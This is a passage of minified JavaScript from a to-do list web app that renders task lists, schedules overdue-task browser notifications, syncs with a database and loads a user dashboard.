5px"});M.addEventListener("input",e=>{e.preventDefault();let t=M.dataset.todoId,n=M.textContent.replace(`
`,"").trim();n.length>=1&&!g.todoLists.some(r=>r.name==n)&&bc(t,n)});Vt.addEventListener("click",e=>{M.style.backgroundColor="transparent",M.style.padding="0",M.blur(),Vt.classList.add("hidden"),ue()});y("[data-clear-complete-tasks]").addEventListener("click",e=>{e.preventDefault();let t=g.todoLists.find(n=>n.id===g.selectedListId);t.tasks=t.tasks.filter(n=>!n.completed),ue(),ft()});y("[data-delete-todo-list]").addEventListener("click",e=>{e.preventDefault(),g.todoLists=g.todoLists.filter(t=>t.id!==g.selectedListId),g.selectedListId="",ue(),ft()});function yc(e){return{id:Date.now().toString(),name:e,tasks:[]}}function wc(e){return{id:Date.now().toString(),name:e,completed:!1,alarmDate:"",alarmTime:"",notified:!1,overdue:!1}}function Ws(){Xs(Wt),Tc();let e=g.todoLists.find(t=>t.id===g.selectedListId);g.selectedListId===""||!g.todoLists.length?(y("[data-todo-display-empty]").classList.remove("hidden"),Fs.style.display="none"):(y("[data-todo-display-empty]").classList.add("hidden"),Fs.style.display="",M.innerText=e.name!==void 0?e.name:"",M.setAttribute("contenteditable","true"),M.dataset.todoId=e.id,Js(e),Xs(lt),xc(e))}function Tc(){g.todoLists.forEach(e=>{let t=`
            <svg class="h-6 w-6 pointer-events-none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                <path d="M9 2a1 1 0 000 2h2a1 1 0 100-2H9z" />
                <path fill-rule="evenodd" d="M4 5a2 2 0 012-2 3 3 0 003 3h2a3 3 0 003-3 2 2 0 012 2v11a2 2 0 01-2 2H6a2 2 0 01-2-2V5zm3 4a1 1 0 000 2h.01a1 1 0 100-2H7zm3 0a1 1 0 000 2h3a1 1 0 100-2h-3zm-3 4a1 1 0 100 2h.01a1 1 0 100-2H7zm3 0a1 1 0 100 2h3a1 1 0 100-2h-3z" clip-rule="evenodd" />
            </svg>
            <span class="ml-3 pointer-events-none">${e.name}</span>
        `,n=["flex","items-center","mb-2","p-2","text-base","text-indigo-700","bg-gray-200","rounded"],r=["flex","items-center","mb-2","p-2","text-base","text-gray-600","hover:text-gray-700","hover:bg-gray-200","rounded"],o=document.createElement("a");o.href="#",o.dataset.todoId=e.id,o.innerHTML=t,o.dataset.todoId===g.selectedListId?o.classList.add(...n):o.classList.add(...r),Wt.appendChild(o)})}function bc(e,t){let n=g.todoLists.find(r=>r.id==e);n.name=t}function Js(e){let t=e.tasks.filter(r=>!r.completed).length,n=t===1?"task":"tasks";y("[data-todo-count]").innerText=`${t} ${n} remaining`}function xc(e){e.tasks.forEach(t=>{let{id:n,name:r,alarmDate:o,alarmTime:u,completed:f,notified:l,overdue:m}=t,p=document.importNode(y("#task-template").content,!0);p.querySelector("form").setAttribute(`data-form-id-${n}`,""),p.querySelector("form").dataset.taskId=n,p.querySelector("input[name=alarm-date]").value=o,p.querySelector("input[name=alarm-time]").value=u,p.querySelector("[data-toggle-alarm-form]").dataset.targetformId=n;let w=p.querySelector("input[name=task-checkbox]");w.id=n,w.checked=f;let b=p.querySelector("label");b.htmlFor=n,b.append(r);let N=p.querySelector("[data-due-text]");N.innerText=!m&&o&&u?`Task due on ${new Date(`${o} ${u}`).toLocaleString()}`:m?"Task overdue, marked as complete.":"",m&&N.classList.add("text-pink-400");let te=p.querySelector("[data-notified-text]");te.innerText=m&&l?"Notified!":m&&!l?"Not notified!":"",l||te.classList.add("text-indigo-500"),lt.appendChild(p)})}function Xs(e){for(;e.firstChild;)e.removeChild(e.firstChild)}async function Gs(){try{console.warn(g),console.warn({...k()})}catch(e){console.error(e)}try{console.log(g),console.log({...k()})}catch(e){console.error(e)}try{let e=await Ns(g.todoLists,g.selectedListId,{...k()});g={...g,...e},Bt===!1&&zs()&&$s()}catch(e){let n=function(){t>1?y("[data-db-error]").innerText=`Database connection error. To prevent data loss you'll be logged out in ${t-1}s.`:(y("#show-db-error").classList.add("hidden"),y("[data-db-error]").innerText="",Jt()),t--,t>0&&setTimeout(n,1e3)};console.error("fUpdateTodos >>>",e.message),y("#show-db-error").classList.remove("hidden");let t=6;n()}}function ue(){Gs(),Ws()}function mc(){"Notification"in window?Ec()?Notification.requestPermission().then(()=>Yt()):Notification.requestPermission(()=>Yt()):console.log("This browser does not support notifications.")}function Ec(){try{Notification.requestPermission().then()}catch(e){return!1}return!0}function Yt(){Ys()?Ut.classList.add("hidden"):Ut.classList.remove("hidden")}function Ys(){return!(Notification.permission==="denied"||Notification.permission==="default")}function zs(){return g.todoLists.length&&g.todoLists.reduce((e,t)=>e+t.tasks.length,0)}function Sc(){if(Ae()&&zs()){let e=0,t=n=>{let{alarmDate:r,alarmTime:o,name:u,notified:f,overdue:l}=n;if(r&&o){let m=Date.parse(`${r} ${o}`),p=Date.now(),w="img/notifications-icon-128x128.png",b=`Hey ${g.firstName}! Your task "${u}" is now overdue and has been marked as complete.`;!l&&p>m&&(!f&&Ys()&&(console.warn("ALARM"),console.log("ALARM"),new Notification("ToDo's JS",{body:b,icon:w}),n.notified=!0),n.completed=!0,n.overdue=!0,e++)}return n};g.todoLists=g.todoLists.map(n=>(n.tasks.length&&n.tasks.map(t),n)),e&&ue()}else Vs()}function $s(){Ps=setInterval(Sc,5e3),Bt=!0}function Vs(){clearInterval(Ps),Bt=!1}async function _c(){if(k()!==null&&"userRef"in k()&&"secret"in k()){O("Loading your dashboard...");try{g={...await jt({...k()})},Xt(),O()}catch(e){console.error("fGetUserData >>> ",e.message),Jt(),O()}}else ee("#home-component")}window.onload=()=>{_c()};
/*
object-assign
(c) Sindre Sorhus
@license MIT
*/
//# sourceMappingURL=//.//app.js.map
